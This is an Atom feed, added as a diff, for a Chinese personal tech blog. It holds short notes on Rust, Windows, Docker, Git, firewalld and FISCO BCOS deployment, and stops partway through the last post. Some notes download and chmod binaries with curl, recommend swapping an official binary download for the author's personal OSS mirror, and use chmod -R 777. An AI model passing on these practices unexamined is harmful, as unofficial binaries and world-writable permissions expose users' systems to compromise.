@@ -1,0 +1,499 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>XiaoYue</title>
+  
+  <subtitle>以梦为马,不负韶华</subtitle>
+  <link href="https://x1a0.net/atom.xml" rel="self"/>
+  
+  <link href="https://x1a0.net/"/>
+  <updated>2021-07-27T11:21:30.000Z</updated>
+  <id>https://x1a0.net/</id>
+  
+  <author>
+    <name>肖越</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>rust学习第二天</title>
+    <link href="https://x1a0.net/2021/07/27/rust%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9/"/>
+    <id>https://x1a0.net/2021/07/27/rust%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9/</id>
+    <published>2021-07-27T10:08:30.000Z</published>
+    <updated>2021-07-27T11:21:30.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>切片</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//传入一个字符串切片，输出第一个单词</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">first_word</span> </span>(_<span class="built_in">str</span>:&amp;<span class="built_in">str</span>) -&gt; &amp;<span class="built_in">str</span> &#123; <span class="comment">//需要传入字符串切片，传出也是字符串切片。</span></span><br><span class="line">    <span class="keyword">let</span> byte_str = _<span class="built_in">str</span>.as_bytes();<span class="comment">//字符串切片类型没法直接迭代，通过as_bytes转换成字节数组。</span></span><br><span class="line">    <span class="keyword">for</span> (num,&amp;value) <span class="keyword">in</span> byte_str.iter().enumerate()&#123; <span class="comment">//通过字节数组.iter().enumerate()解耦，返回（下标，值）。</span></span><br><span class="line">        <span class="keyword">if</span> value == <span class="string">b&#x27; &#x27;</span> &#123; <span class="comment">//只能用b&#x27; &#x27;这个表示空格，不知道直接 &#x27; &#x27;，&quot; &quot;为啥不行。</span></span><br><span class="line">            <span class="keyword">return</span> &amp;_<span class="built_in">str</span>[..num];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &amp;_<span class="built_in">str</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> _string_type_1 = <span class="string">&quot;hello xiaoyue&quot;</span>;<span class="comment">//本来就是字符串引用类型，[声明出来不可变了，栈中的]</span></span><br><span class="line">    <span class="keyword">let</span> _string_type_2 = <span class="built_in">String</span>::from(<span class="string">&quot;hello xiaoyue&quot;</span>);<span class="comment">//这个是字符串类型，所以传参的时候要加&amp;引用符号，[专门声明的堆中的]</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> s = first_word(&amp;_string_type_2);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>,s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;切片&lt;/p&gt;
+&lt;figure class=&quot;highlight rust&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;s</summary>
+      
+    
+    
+    
+    <category term="Rust" scheme="https://x1a0.net/categories/Rust/"/>
+    
+    
+    <category term="Rust" scheme="https://x1a0.net/tags/Rust/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>rust学习第一天</title>
+    <link href="https://x1a0.net/2021/07/26/rust%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9/"/>
+    <id>https://x1a0.net/2021/07/26/rust%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9/</id>
+    <published>2021-07-26T07:19:25.000Z</published>
+    <updated>2021-07-27T11:21:08.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>包引入，取随机数，枚举类使用</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::io::stdin; <span class="comment">//引入stdin包，通过sdtin下的read_line函数获取命令行返回值</span></span><br><span class="line"><span class="keyword">use</span> rand::Rng; <span class="comment">//引入Rng这个接口，通过rand::thread_rng().gen_range()获取随机数</span></span><br><span class="line"><span class="keyword">use</span> std::cmp::Ordering;<span class="comment">//引入枚举包，通过ordering::xx来控制返回，通过match抓取不同的ordering</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> sec = rand::thread_rng().gen_range(<span class="number">1</span>..<span class="number">101</span>);      </span><br><span class="line">    <span class="built_in">print!</span>(<span class="string">&quot;这个秘密的数是：&#123;&#125;\n&quot;</span>,sec);</span><br><span class="line">    <span class="keyword">loop</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> string1 = <span class="built_in">String</span>::new();<span class="comment">//声明一个string类型的可变变量string::new()</span></span><br><span class="line">        stdin().read_line(&amp;<span class="keyword">mut</span> string1).expect(<span class="string">&quot;不能读取！\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">let</span> string1:<span class="built_in">i32</span> = <span class="keyword">match</span> string1.trim().parse() &#123; <span class="comment">//变量的覆盖，通过let var_name:type = xx重新覆盖变量，必须声明类型。trim去首尾空，parse转数字，match抓取返回成功和err值并打印。</span></span><br><span class="line">            <span class="literal">Ok</span>(num) =&gt; num,</span><br><span class="line">            <span class="literal">Err</span>(err) =&gt; &#123;</span><br><span class="line">                <span class="built_in">print!</span>(<span class="string">&quot;&#123;&#125;\n&quot;</span>,err);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">match</span> sec.cmp(&amp;string1) &#123; <span class="comment">//这个是将string1和sec进行比较</span></span><br><span class="line">            Ordering::Greater =&gt; <span class="built_in">print!</span>(<span class="string">&quot;small\n&quot;</span>),</span><br><span class="line">            Ordering::Equal =&gt; &#123;</span><br><span class="line">                <span class="built_in">print!</span>(<span class="string">&quot;win!!\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;,</span><br><span class="line">            Ordering::Less =&gt; <span class="built_in">print!</span>(<span class="string">&quot;big\n&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;包引入，取随机数，枚举类使用&lt;/p&gt;
+&lt;figure class=&quot;highlight rust&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;</summary>
+      
+    
+    
+    
+    <category term="Rust" scheme="https://x1a0.net/categories/Rust/"/>
+    
+    
+    <category term="Rust" scheme="https://x1a0.net/tags/Rust/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>win11默认开启hyper-v解决方案</title>
+    <link href="https://x1a0.net/2021/07/16/win11%E9%BB%98%E8%AE%A4%E5%BC%80%E5%90%AFhyper-v%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
+    <id>https://x1a0.net/2021/07/16/win11%E9%BB%98%E8%AE%A4%E5%BC%80%E5%90%AFhyper-v%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</id>
+    <published>2021-07-15T18:42:22.000Z</published>
+    <updated>2021-07-15T18:45:00.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>快捷键win+x,使用管理员权限打开Windows Powershell<br>关闭：bcdedit /set hypervisorlaunchtype off<br>开启: bcdedit /set hypervisorlaunchtype auto</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;快捷键win+x,使用管理员权限打开Windows Powershell&lt;br&gt;关闭：bcdedit /set hypervisorlaunchtype off&lt;br&gt;开启: bcdedit /set hypervisorlaunchtype auto&lt;/p&gt;
+</summary>
+      
+    
+    
+    
+    
+    <category term="Windows" scheme="https://x1a0.net/tags/Windows/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>centos7安装docker和compose</title>
+    <link href="https://x1a0.net/2021/05/04/centos7%E5%AE%89%E8%A3%85docker%E5%92%8Ccompose/"/>
+    <id>https://x1a0.net/2021/05/04/centos7%E5%AE%89%E8%A3%85docker%E5%92%8Ccompose/</id>
+    <published>2021-05-04T02:46:45.000Z</published>
+    <updated>2021-05-04T03:29:48.000Z</updated>
+    
+    <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yum install docker #安装</span><br><span class="line"></span><br><span class="line">service docker start #启动</span><br><span class="line">chkconfig docker on  #设置启动项</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://github.com/docker/compose/releases/download/1.26.0/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose </span><br><span class="line"></span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class</summary>
+      
+    
+    
+    
+    <category term="Linux" scheme="https://x1a0.net/categories/Linux/"/>
+    
+    <category term="Docker" scheme="https://x1a0.net/categories/Docker/"/>
+    
+    
+    <category term="Linux" scheme="https://x1a0.net/tags/Linux/"/>
+    
+    <category term="Docker" scheme="https://x1a0.net/tags/Docker/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Git设置、取消代理</title>
+    <link href="https://x1a0.net/2021/05/04/Git%E8%AE%BE%E7%BD%AE%E3%80%81%E5%8F%96%E6%B6%88%E4%BB%A3%E7%90%86/"/>
+    <id>https://x1a0.net/2021/05/04/Git%E8%AE%BE%E7%BD%AE%E3%80%81%E5%8F%96%E6%B6%88%E4%BB%A3%E7%90%86/</id>
+    <published>2021-05-04T02:22:28.000Z</published>
+    <updated>2021-05-04T03:30:10.000Z</updated>
+    
+    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置代理</span></span><br><span class="line">git config --global https.proxy http://127.0.0.1:1080</span><br><span class="line"></span><br><span class="line">git config --global https.proxy https://127.0.0.1:1080</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#取消代理</span></span><br><span class="line">git config --global --<span class="built_in">unset</span> http.proxy</span><br><span class="line"></span><br><span class="line">git config --global --<span class="built_in">unset</span> https.proxy</span><br><span class="line"></span><br><span class="line"><span class="comment">#打开c:\Users\当前用户里的.gitconfig文件(这个默认是隐藏文件),</span></span><br><span class="line"><span class="comment">#将里面关于proxy的行删掉</span></span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=</summary>
+      
+    
+    
+    
+    <category term="Git" scheme="https://x1a0.net/categories/Git/"/>
+    
+    
+    <category term="Git" scheme="https://x1a0.net/tags/Git/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Peer reports incompatible or unsupported protocol version.</title>
+    <link href="https://x1a0.net/2021/04/28/Peer%20reports%20incompatible%20or%20unsupported%20protocol%20version/"/>
+    <id>https://x1a0.net/2021/04/28/Peer%20reports%20incompatible%20or%20unsupported%20protocol%20version/</id>
+    <published>2021-04-28T06:37:57.000Z</published>
+    <updated>2021-05-04T02:58:52.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>解决方案：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum update -y nss curl libcurl </span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;解决方案：&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;p</summary>
+      
+    
+    
+    
+    <category term="Git" scheme="https://x1a0.net/categories/Git/"/>
+    
+    
+    <category term="Git" scheme="https://x1a0.net/tags/Git/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>vscode配置在选项卡中打开新窗口</title>
+    <link href="https://x1a0.net/2021/04/26/vscode%E9%85%8D%E7%BD%AE%E5%9C%A8%E9%80%89%E9%A1%B9%E5%8D%A1%E4%B8%AD%E6%89%93%E5%BC%80%E6%96%B0%E7%AA%97%E5%8F%A3/"/>
+    <id>https://x1a0.net/2021/04/26/vscode%E9%85%8D%E7%BD%AE%E5%9C%A8%E9%80%89%E9%A1%B9%E5%8D%A1%E4%B8%AD%E6%89%93%E5%BC%80%E6%96%B0%E7%AA%97%E5%8F%A3/</id>
+    <published>2021-04-26T15:04:20.000Z</published>
+    <updated>2021-07-15T18:43:38.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>workbench.editor.enablePreview</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;workbench.editor.enablePreview&lt;/p&gt;
+</summary>
+      
+    
+    
+    
+    
+    <category term="Vscode" scheme="https://x1a0.net/tags/Vscode/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Python websocket 部署小记</title>
+    <link href="https://x1a0.net/2021/02/08/197/"/>
+    <id>https://x1a0.net/2021/02/08/197/</id>
+    <published>2021-02-07T19:25:00.000Z</published>
+    <updated>2021-02-07T19:26:02.000Z</updated>
+    
+    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># WS server that sends messages at random intervals</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">time</span>(<span class="params">websocket, path</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        now = datetime.datetime.utcnow().isoformat() + <span class="string">&#x27;Z&#x27;</span></span><br><span class="line">        <span class="keyword">await</span> websocket.send(now)</span><br><span class="line">        <span class="keyword">await</span> asyncio.sleep(random.random() * <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">start_server = websockets.serve(time, <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">5678</span>)</span><br><span class="line"></span><br><span class="line">asyncio.get_event_loop().run_until_complete(start_server)</span><br><span class="line">asyncio.get_event_loop().run_forever()</span><br></pre></td></tr></table></figure><p>客户端跑不到。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TimeoutError: [Errno 10060] Connect call failed (&#x27;xx&#x27;, 8765)</span><br></pre></td></tr></table></figure><p>端口监听成功的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -lnpt</span><br></pre></td></tr></table></figure><p>centos7 检查防火墙：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --state</span><br></pre></td></tr></table></figure><p>开启状态，检查端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone=public --list-ports</span><br></pre></td></tr></table></figure><p>未开放，开启端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=5672/tcp --permanent   # 开放5672端口</span><br><span class="line"></span><br><span class="line">firewall-cmd --zone=public --remove-port=5672/tcp --permanent  # 关闭5672端口</span><br><span class="line"></span><br><span class="line">firewall-cmd --reload   # 配置立即生效</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span clas</summary>
+      
+    
+    
+    
+    <category term="Python" scheme="https://x1a0.net/categories/Python/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>制作requirements.txt</title>
+    <link href="https://x1a0.net/2020/12/18/196/"/>
+    <id>https://x1a0.net/2020/12/18/196/</id>
+    <published>2020-12-18T00:52:01.000Z</published>
+    <updated>2020-12-18T00:52:01.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>pipreqs ./ –encoding=utf8</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;pipreqs ./ –encoding=utf8&lt;/p&gt;
+</summary>
+      
+    
+    
+    
+    <category term="Python" scheme="https://x1a0.net/categories/Python/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>linux 查看系统版本信息</title>
+    <link href="https://x1a0.net/2020/10/16/195/"/>
+    <id>https://x1a0.net/2020/10/16/195/</id>
+    <published>2020-10-16T12:45:26.000Z</published>
+    <updated>2020-10-16T12:45:26.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>1、lsb_release -a，这个命令适用于所有的Linux发行版，包括RedHat、SUSE、Debian…等发行版。</p><p>2、cat /etc/redhat-release，这种方法只适合Redhat系的Linux</p><p>3、cat /etc/issue，此命令也适用于所有的Linux发行版。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;1、lsb_release -a，这个命令适用于所有的Linux发行版，包括RedHat、SUSE、Debian…等发行版。&lt;/p&gt;
+&lt;p&gt;2、cat /etc/redhat-release，这种方法只适合Redhat系的Linux&lt;/p&gt;
+&lt;p&gt;3、cat /etc/is</summary>
+      
+    
+    
+    
+    <category term="Linux" scheme="https://x1a0.net/categories/Linux/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>linux相关操作记录</title>
+    <link href="https://x1a0.net/2020/10/04/194/"/>
+    <id>https://x1a0.net/2020/10/04/194/</id>
+    <published>2020-10-03T18:15:29.000Z</published>
+    <updated>2020-10-03T18:15:29.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>当前文件夹下全部赋权<br>chmod -R 777 ./</p><p>查看端口详情，正则匹配fb<br>netstat -anp | grep fisco-bcos</p><p>杀死<br>kill -9 id</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;当前文件夹下全部赋权&lt;br&gt;chmod -R 777 ./&lt;/p&gt;
+&lt;p&gt;查看端口详情，正则匹配fb&lt;br&gt;netstat -anp | grep fisco-bcos&lt;/p&gt;
+&lt;p&gt;杀死&lt;br&gt;kill -9 id&lt;/p&gt;
+</summary>
+      
+    
+    
+    
+    <category term="Linux" scheme="https://x1a0.net/categories/Linux/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>vps软重启后Apache-PHP没启动</title>
+    <link href="https://x1a0.net/2020/09/24/193/"/>
+    <id>https://x1a0.net/2020/09/24/193/</id>
+    <published>2020-09-24T05:55:09.000Z</published>
+    <updated>2020-09-24T05:55:09.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>安装的宝塔 显示80未配置<br>网站显示拒绝访问</p><p>/www/server/php<br>/etc/init.d/php-fpm-{52|53|54|55|56|70|71|72|73|74} start</p><p>/www/server/httpd<br>/etc/init.d/httpd start</p><p>/www/server/nginx<br>/etc/init.d/nginx start</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;安装的宝塔 显示80未配置&lt;br&gt;网站显示拒绝访问&lt;/p&gt;
+&lt;p&gt;/www/server/php&lt;br&gt;/etc/init.d/php-fpm-{52|53|54|55|56|70|71|72|73|74} start&lt;/p&gt;
+&lt;p&gt;/www/server/httpd&lt;br</summary>
+      
+    
+    
+    
+    <category term="Linux" scheme="https://x1a0.net/categories/Linux/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>FISCO BCOS多机部署之单群组双机构双节点组网模式</title>
+    <link href="https://x1a0.net/2020/07/22/190/"/>
+    <id>https://x1a0.net/2020/07/22/190/</id>
+    <published>2020-07-21T16:06:31.000Z</published>
+    <updated>2020-07-21T16:06:31.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>今天凌晨交的POC，现在复现完组网过程就可以碎觉了，emm~</p><hr><h2 id="0-需求分析"><a href="#0-需求分析" class="headerlink" title="0.需求分析"></a>0.需求分析</h2><p>有两台服务器，狗子哥说每台服务器一个节点。那么每台机子下一个机构生成一个节点，两个连一块，即：双机构双节点单群组。<br>这样就不能使用官方的一键螺旋快乐飞天脚本了：<br><img src="https://img-blog.csdnimg.cn/20200721225029310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW95dWUyMDE5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用generator运维部署工具，<br>于是就出现了问题（基地爆炸，问题不大）。</p><hr><h2 id="1-下载安装运维部署工具"><a href="#1-下载安装运维部署工具" class="headerlink" title="1.下载安装运维部署工具"></a>1.下载安装运维部署工具</h2><blockquote><p><em>这里假设机子上什么都没有，因为使用源码编译客户端的用户不用最后一步</em></p></blockquote><p>下载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/ &amp;&amp; git clone https://github.com/FISCO-BCOS/generator.git</span><br><span class="line">Copy to clipboard</span><br></pre></td></tr></table></figure><p>安装(此操作要求用户具有sudo权限)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/generator &amp;&amp; bash ./scripts/install.sh</span><br><span class="line">Copy to clipboard</span><br></pre></td></tr></table></figure><p>检查是否安装成功，若成功，输出 usage: generator xxx</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./generator -h</span><br></pre></td></tr></table></figure><p>获取节点二进制<br>拉取最新fisco-bcos二进制文件到meta中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./generator --download_fisco ./meta</span><br></pre></td></tr></table></figure><p>检查二进制版本<br>若成功，输出 FISCO-BCOS Version : x.x.x-x</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./meta/fisco-bcos -v</span><br></pre></td></tr></table></figure><p>这里遇到的问题是，二进制文件拉取贼慢。<br>然后我再本机把generator克隆下来，发现是:<br><img src="https://img-blog.csdnimg.cn/20200721230416252.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW95dWUyMDE5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>工具类的download_fisco函数这里卡主了。没有cdn的朋友可以vim修改下这个url为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xiaoyue-blog.oss-cn-hangzhou.aliyuncs.com/fisco-bcos.tar.gz</span><br></pre></td></tr></table></figure><p>这是我的OSS，开放给大家使用轻点敲啊。</p><p>一秒不到就下完了。然后这个就是装好了：<br><img src="https://img-blog.csdnimg.cn/20200721230817108.png" alt="在这里插入图片描述"></p><hr><h2 id="2-联盟链初始化"><a href="#2-联盟链初始化" class="headerlink" title="2.联盟链初始化"></a>2.联盟链初始化</h2><p>来康康拓扑图：<br><img src="https://img-blog.csdnimg.cn/20200721231612239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW95dWUyMDE5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>因为官方教程是在一个机子上配的，是节点1,2。分起来的话实际上没有1,2之分的。因为是在两台机子上，也不会存在端口冲突的情况。如果端口没有打开可能会报错，这边建议把两台机子添加白名单就行了。详情可参考：<a href="https://blog.csdn.net/xiaoyue2019/article/details/107401334">FSICO BCOS多机部署之端口开放</a><br>机构|节点|rpc端口|channel端口|p2p端口<br>—|—|—|—|—|<br>机构A|节点1|8545|20200|30300<br>机构B|节点2|8545|20200|30300</p><h3 id="2-1-机构初始化"><a href="#2-1-机构初始化" class="headerlink" title="2.1 机构初始化"></a>2.1 机构初始化</h3><h1 id="初始化机构AB"><a href="#初始化机构AB" class="headerlink" title="初始化机构AB"></a>初始化机构AB</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/generator</span><br><span class="line">cp -r ~/generator ~/generator-A</span><br><span class="line">cp -r ~/generator ~/generator-B</span><br></pre></td></tr></table></figure><h3 id="2-2-链初始化"><a href="#2-2-链初始化" class="headerlink" title="2.2 链初始化"></a>2.2 链初始化</h3><h1 id="生成链证书ca-crt-amp-链私钥ca-key"><a href="#生成链证书ca-crt-amp-链私钥ca-key" class="headerlink" title="生成链证书ca.crt&amp;链私钥ca.key"></a>生成链证书ca.crt&amp;链私钥ca.key</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./generator --generate_chain_certificate ./dir_chain_ca</span><br></pre></td></tr></table></figure><p>链证书和链私钥在<code>./dir_chain_ca</code></p><hr><h2 id="3-构建群组"><a href="#3-构建群组" class="headerlink" title="3.构建群组"></a>3.构建群组</h2><h3 id="3-1-初始化机构A"><a href="#3-1-初始化机构A" class="headerlink" title="3.1 初始化机构A"></a>3.1 初始化机构A</h3><h1 id="生成机构A的证书"><a href="#生成机构A的证书" class="headerlink" title="生成机构A的证书"></a>生成机构A的证书</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./generator --generate_agency_certificate ./dir_agency_ca ./dir_chain_ca agencyA</span><br></pre></td></tr></table></figure><h1 